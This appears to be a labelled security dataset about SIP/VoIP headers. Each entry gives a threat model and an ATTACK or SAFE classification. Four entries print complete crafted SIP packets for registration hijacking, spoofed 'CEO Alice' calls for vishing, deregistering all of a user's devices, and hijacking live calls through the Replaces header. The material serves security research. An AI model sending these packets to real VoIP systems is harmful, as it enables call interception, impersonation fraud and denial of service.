## 1) REGISTER - Contact
**Message:** REGISTER
**Target Header's path:** Contact
**Threat Model:**
- **Attack Assumption:**
In the target enterprise VoIP network, a SIP Registrar/Proxy server handles SIP signaling for registered users over the SIP protocol (RFC 3261).
We assume: (i) the victim SIP registrar's signaling port (UDP 5060) is reachable from the attacker's network due to misconfiguration or insufficient network segmentation; (ii) the SIP registrar does not enforce TLS for signaling and transmits SIP messages in cleartext over UDP; (iii) the SIP registrar does not require Digest authentication for incoming REGISTER requests (e.g., Kamailio's default configuration without WITH_AUTH enabled); (iv) the SIP registrar processes attacker-crafted SIP requests and updates location bindings according to RFC 3261 Section 10; and (v) the attacker has obtained the target user's SIP URI (Address of Record), e.g., sip:alice@example.com.
- **Attacker Capability:**
The attacker is restricted to only send one SIP request message and passively receive a corresponding response.

**Attack Procedure:**
The attacker crafts an Attack Message REGISTER, ensuring that all mandatory SIP headers (Via, To, From, Call-ID, CSeq, Max-Forwards) are included with well-formed syntax and valid values. This allows the victim SIP registrar to correctly parse and process the request according to RFC 3261 Section 10.3. Specifically, the attacker sets the To header to sip:alice@example.com (the victim user's Address of Record) and sets the Contact header to sip:attacker@10.0.0.50:5060 (the attacker's own address). The attacker then sends the crafted REGISTER to the victim SIP registrar to hijack the victim's registration.

After the registrar processes the message, it updates the location binding for alice@example.com, replacing the legitimate contact address with the attacker's address 10.0.0.50:5060. All subsequent incoming INVITE requests (calls) and MESSAGE requests intended for alice@example.com will be routed to the attacker instead of alice's legitimate phone. The PoC is successful if an incoming call to alice@example.com is delivered to the attacker's endpoint.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "sip_start_line": {
    "method": "REGISTER",
    "request_uri": "sip:proxy.example.com",
    "version": "SIP/2.0"
  },
  "headers": [
    {
      "header_name": "Via",
      "header_value": "SIP/2.0/UDP 10.0.0.50:5060;branch=z9hG4bKnashds7"
    },
    {
      "header_name": "Max-Forwards",
      "header_value": "70"
    },
    {
      "header_name": "To",
      "header_value": "<sip:alice@example.com>"
    },
    {
      "header_name": "From",
      "header_value": "<sip:alice@example.com>;tag=a73kszlfl"
    },
    {
      "header_name": "Call-ID",
      "header_value": "843817637684230@10.0.0.50"
    },
    {
      "header_name": "CSeq",
      "header_value": "1 REGISTER"
    },
    {
      "header_name": "Contact",
      "header_value": "<sip:attacker@10.0.0.50:5060>"
    },
    {
      "header_name": "Expires",
      "header_value": "3600"
    },
    {
      "header_name": "Content-Length",
      "header_value": "0"
    }
  ]
}

**Classification:**
ATTACK


## 2) INVITE - From
**Message:** INVITE
**Target Header's path:** From
**Threat Model:**
- **Attack Assumption:**
In the target enterprise VoIP network, a SIP Proxy server handles SIP signaling for registered users over the SIP protocol (RFC 3261).
We assume: (i) the victim SIP proxy's signaling port (UDP 5060) is reachable from the attacker's network due to misconfiguration or insufficient network segmentation; (ii) the SIP proxy does not enforce TLS for signaling and transmits SIP messages in cleartext over UDP; (iii) the SIP proxy does not validate the From header against the sender's authenticated identity (e.g., no Digest authentication enforced, or the proxy does not cross-check the From URI with credentials as described in RFC 3261 Section 22); (iv) the SIP proxy processes attacker-crafted SIP requests and forwards them to the target callee according to standard SIP routing rules; and (v) the attacker has obtained the target callee's SIP URI, e.g., sip:bob@example.com, and knows a legitimate user's SIP URI to impersonate, e.g., sip:alice@example.com.
- **Attacker Capability:**
The attacker is restricted to only send one SIP request message and passively receive a corresponding response.

**Attack Procedure:**
The attacker crafts an Attack Message INVITE, ensuring that all mandatory SIP headers are included with well-formed syntax and valid values, along with a valid SDP body for media negotiation. This allows the victim SIP proxy to correctly parse and route the request according to RFC 3261 Section 16. Specifically, the attacker sets the From header to "CEO Alice" <sip:alice@example.com>;tag=1928301774, impersonating a trusted user's identity and display name. The Request-URI and To header are set to sip:bob@example.com (the target callee). The attacker then sends the crafted INVITE through the victim SIP proxy.

After the SIP proxy processes and forwards the INVITE, bob's SIP phone displays an incoming call from "CEO Alice" (alice@example.com). The callee cannot distinguish this spoofed call from a legitimate one. The attacker can then conduct voice phishing (vishing) to extract sensitive information, authorize fraudulent transactions, or issue fraudulent instructions while impersonating a trusted colleague. The PoC is successful if the callee's phone displays the spoofed caller identity (both display name and SIP URI).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "sip_start_line": {
    "method": "INVITE",
    "request_uri": "sip:bob@example.com",
    "version": "SIP/2.0"
  },
  "headers": [
    {
      "header_name": "Via",
      "header_value": "SIP/2.0/UDP 10.0.0.50:5060;branch=z9hG4bK776asdhds"
    },
    {
      "header_name": "Max-Forwards",
      "header_value": "70"
    },
    {
      "header_name": "To",
      "header_value": "<sip:bob@example.com>"
    },
    {
      "header_name": "From",
      "header_value": "\"CEO Alice\" <sip:alice@example.com>;tag=1928301774"
    },
    {
      "header_name": "Call-ID",
      "header_value": "a84b4c76e66710@10.0.0.50"
    },
    {
      "header_name": "CSeq",
      "header_value": "314159 INVITE"
    },
    {
      "header_name": "Contact",
      "header_value": "<sip:10.0.0.50:5060>"
    },
    {
      "header_name": "Content-Type",
      "header_value": "application/sdp"
    },
    {
      "header_name": "Content-Length",
      "header_value": "128"
    }
  ],
  "sdp_body": {
    "v": "0",
    "o": "- 2890844526 2890844526 IN IP4 10.0.0.50",
    "s": "-",
    "c": "IN IP4 10.0.0.50",
    "t": "0 0",
    "m": "audio 49170 RTP/AVP 0",
    "a": "rtpmap:0 PCMU/8000"
  }
}

**Classification:**
ATTACK



## 3) REGISTER - Expires
**Message:** REGISTER
**Target Header's path:** Expires
**Threat Model:**
- **Attack Assumption:**
In the target enterprise VoIP network, a SIP Registrar/Proxy server (e.g., Kamailio) handles SIP signaling for registered users over the SIP protocol (RFC 3261).
We assume: (i) the victim SIP registrar's signaling port (UDP 5060) is reachable from the attacker's network due to misconfiguration or insufficient network segmentation; (ii) the SIP registrar does not enforce TLS for signaling and transmits SIP messages in cleartext over UDP; (iii) the SIP registrar does not require Digest authentication for incoming REGISTER requests (e.g., Kamailio's default configuration without WITH_AUTH enabled); (iv) the SIP registrar processes attacker-crafted SIP requests and updates location bindings according to RFC 3261 Section 10; and (v) the attacker has obtained the target user's SIP URI (Address of Record), e.g., sip:alice@example.com.
- **Attacker Capability:**
The attacker is restricted to only send one SIP request message and passively receive a corresponding response.

**Attack Procedure:**
The attacker crafts an Attack Message REGISTER, ensuring that all mandatory SIP headers (Via, To, From, Call-ID, CSeq, Max-Forwards) are included with well-formed syntax and valid values. This allows the victim SIP registrar to correctly parse and process the request. Specifically, the attacker sets the Contact header to * (the REGISTER-specific wildcard value defined in RFC 3261 Section 10.2.2, meaning "all registrations for this Address of Record") and sets the Expires header to 0 (requesting immediate removal of bindings). Per RFC 3261 Section 10.2.2, the wildcard Contact value of * "applies to all registrations, but it MUST NOT be used unless the Expires header field is present with a value of 0." This combination instructs the registrar to remove all contact bindings for the victim's AoR without the attacker needing to know the victim's actual contact addresses.

After the registrar processes the message, all contact bindings for alice@example.com are removed. The victim's phone is no longer registered: all subsequent incoming INVITE requests (calls) and MESSAGE requests for alice@example.com will fail with a 480 Temporarily Unavailable response. The victim will not receive any incoming calls until they re-register. The PoC is successful if the victim's registration is removed and incoming calls to the victim are no longer delivered.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "sip_start_line": {
    "method": "REGISTER",
    "request_uri": "sip:proxy.example.com",
    "version": "SIP/2.0"
  },
  "headers": [
    {
      "header_name": "Via",
      "header_value": "SIP/2.0/UDP 10.0.0.50:5060;branch=z9hG4bK9f2a8d3e"
    },
    {
      "header_name": "Max-Forwards",
      "header_value": "70"
    },
    {
      "header_name": "To",
      "header_value": "<sip:alice@example.com>"
    },
    {
      "header_name": "From",
      "header_value": "<sip:alice@example.com>;tag=b5d8e3f1"
    },
    {
      "header_name": "Call-ID",
      "header_value": "73920186347@10.0.0.50"
    },
    {
      "header_name": "CSeq",
      "header_value": "1 REGISTER"
    },
    {
      "header_name": "Contact",
      "header_value": "*"
    },
    {
      "header_name": "Expires",
      "header_value": "0"
    },
    {
      "header_name": "Content-Length",
      "header_value": "0"
    }
  ]
}

**Classification:**
ATTACK


## 4) INVITE - Replaces
**Message:** INVITE
**Target Header's path:** Replaces
**Threat Model:**
- **Attack Assumption:**
In the target enterprise VoIP network, a SIP Proxy server (e.g., Kamailio, Asterisk) handles SIP signaling for registered users over the SIP protocol (RFC 3261).
We assume: (i) the victim SIP proxy's signaling port (UDP 5060) is reachable from the attacker's network due to misconfiguration or insufficient network segmentation; (ii) the SIP proxy does not enforce TLS for signaling and transmits SIP messages in cleartext over UDP; (iii) the SIP proxy does not validate the authorization of INVITE requests containing Replaces headers (i.e., does not enforce RFC 3891 Section 3's authentication requirement); (iv) the SIP proxy transparently forwards INVITE requests containing Replaces headers to the target User Agent according to RFC 3891 Section 5; (v) the attacker has obtained the target callee's SIP URI, e.g., sip:bob@example.com; and (vi) the attacker has obtained the dialog identifiers (Call-ID, From-tag, To-tag) of an active call between the victim users through network sniffing of cleartext SIP signaling.
- **Attacker Capability:**
The attacker is restricted to only send one SIP request message and passively receive a corresponding response.

**Attack Procedure:**
The attacker crafts an Attack Message INVITE, ensuring that all mandatory SIP headers are included with well-formed syntax and valid values, along with a valid SDP body for media negotiation. This allows the victim SIP proxy and the target User Agent to correctly parse and process the request. Specifically, the attacker includes a Replaces header (defined in RFC 3891) containing the dialog identifiers of the active call to be hijacked: the original Call-ID, the from-tag of the original INVITE initiator (alice), and the to-tag assigned by the callee (bob). The attacker also includes a Require: replaces header to ensure the UAS processes the Replaces semantic rather than ignoring it. Per RFC 3891 Section 3, when the UAS (bob) receives an INVITE with a Replaces header matching a confirmed dialog, it "accepts the new INVITE by sending a 200-class response, and shuts down the replaced dialog by sending a BYE." This means bob's UA terminates the active call with alice and establishes a new call with the attacker.

After bob's UA processes the INVITE, the existing call between alice and bob is terminated (bob's UA sends BYE to alice), and a new dialog is established between the attacker and bob. The attacker has effectively stolen alice's place in the active conversation. The PoC is successful if the original call is terminated and the attacker is connected to bob in alice's place.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "sip_start_line": {
    "method": "INVITE",
    "request_uri": "sip:bob@example.com",
    "version": "SIP/2.0"
  },
  "headers": [
    {
      "header_name": "Via",
      "header_value": "SIP/2.0/UDP 10.0.0.50:5060;branch=z9hG4bK4e7f9c2a"
    },
    {
      "header_name": "Max-Forwards",
      "header_value": "70"
    },
    {
      "header_name": "To",
      "header_value": "<sip:bob@example.com>"
    },
    {
      "header_name": "From",
      "header_value": "<sip:attacker@10.0.0.50>;tag=8a3c6b9d"
    },
    {
      "header_name": "Call-ID",
      "header_value": "hijack-9f3e7b1a@10.0.0.50"
    },
    {
      "header_name": "CSeq",
      "header_value": "1 INVITE"
    },
    {
      "header_name": "Contact",
      "header_value": "<sip:10.0.0.50:5060>"
    },
    {
      "header_name": "Replaces",
      "header_value": "425928@phone.example.com;from-tag=aaa111;to-tag=bbb222"
    },
    {
      "header_name": "Require",
      "header_value": "replaces"
    },
    {
      "header_name": "Content-Type",
      "header_value": "application/sdp"
    },
    {
      "header_name": "Content-Length",
      "header_value": "131"
    }
  ],
  "sdp_body": {
    "v": "0",
    "o": "- 5678901234 5678901234 IN IP4 10.0.0.50",
    "s": "-",
    "c": "IN IP4 10.0.0.50",
    "t": "0 0",
    "m": "audio 49170 RTP/AVP 0",
    "a": "rtpmap:0 PCMU/8000"
  }
}

**Classification:**
ATTACK


## 5) REGISTER - Max-Forwards
**Message:** REGISTER
**Target Header's path:** Max-Forwards
**Threat Model:**
- **Attack Assumption:**
In the target enterprise VoIP network, a SIP Registrar/Proxy server (e.g., Kamailio) handles SIP signaling for registered users over the SIP protocol (RFC 3261).
We assume: (i) the victim SIP registrar's signaling port (UDP 5060) is reachable from the attacker's network due to misconfiguration or insufficient network segmentation; (ii) the SIP registrar does not enforce TLS for signaling and transmits SIP messages in cleartext over UDP; (iii) the SIP registrar does not require Digest authentication for incoming REGISTER requests; (iv) the SIP registrar processes attacker-crafted SIP requests and updates location bindings according to RFC 3261 Section 10; and (v) the attacker has obtained the target user's SIP URI (Address of Record), e.g., sip:alice@example.com.
- **Attacker Capability:**
The attacker is restricted to only send one SIP request message and passively receive a corresponding response.
**Security Analysis:**
Max-Forwards is a standard SIP hop-counter header defined in RFC 3261 Section 8.1.1.6, used to limit the number of proxies a request can traverse as a loop prevention mechanism. Each SIP proxy that forwards the request decrements this value by one; if it reaches zero, the proxy returns a 483 Too Many Hops response. In a REGISTER request, manipulating Max-Forwards has no meaningful security impact on other users or the registrar's state: setting it to a low value (e.g., 0 or 1) merely causes the attacker's own REGISTER to be rejected before reaching the registrar, affecting only the attacker's registration attempt; setting it to a high value (e.g., 255) has no effect because proxies decrement it normally and the registrar processes the REGISTER identically regardless of the incoming Max-Forwards value. This header does not influence registration binding decisions, contact address storage, authentication policies, or call routing for any user other than the attacker.

**Classification:**
SAFE


## 6) INVITE - Allow
**Message:** INVITE
**Target Header's path:** Allow
**Threat Model:**
- **Attack Assumption:**
In the target enterprise VoIP network, a SIP Proxy server (e.g., Kamailio, Asterisk) handles SIP signaling for registered users over the SIP protocol (RFC 3261).
We assume: (i) the victim SIP proxy's signaling port (UDP 5060) is reachable from the attacker's network due to misconfiguration or insufficient network segmentation; (ii) the SIP proxy does not enforce TLS for signaling and transmits SIP messages in cleartext over UDP; (iii) the SIP proxy does not validate the From header against the sender's authenticated identity; (iv) the SIP proxy processes attacker-crafted SIP requests and forwards them to the target callee according to standard SIP routing rules; and (v) the attacker has obtained the target callee's SIP URI, e.g., sip:bob@example.com.
- **Attacker Capability:**
The attacker is restricted to only send one SIP request message and passively receive a corresponding response.
**Security Analysis:**
Allow is an informational SIP header defined in RFC 3261 Section 20.5 that advertises the set of SIP methods supported by the User Agent generating the message (e.g., INVITE, ACK, BYE, CANCEL, OPTIONS). When included in an INVITE, it informs the callee's User Agent about which SIP methods the caller claims to support, used solely for in-dialog capability negotiation. Manipulating the Allow header in a crafted INVITE only affects what the callee believes the attacker's UA supports, which may influence whether certain optional in-dialog requests (like INFO, UPDATE, or REFER) are sent back to the attacker. This impact is entirely confined to the attacker's own call session. The SIP proxy does not make routing, authentication, authorization, or billing decisions based on the Allow header value. Legitimate users' ongoing calls and registrations are completely unaffected. The Allow header carries no subscriber data, credentials, or session state, and knowledge of a peer's supported methods cannot be leveraged for further attacks.

**Classification:**
SAFE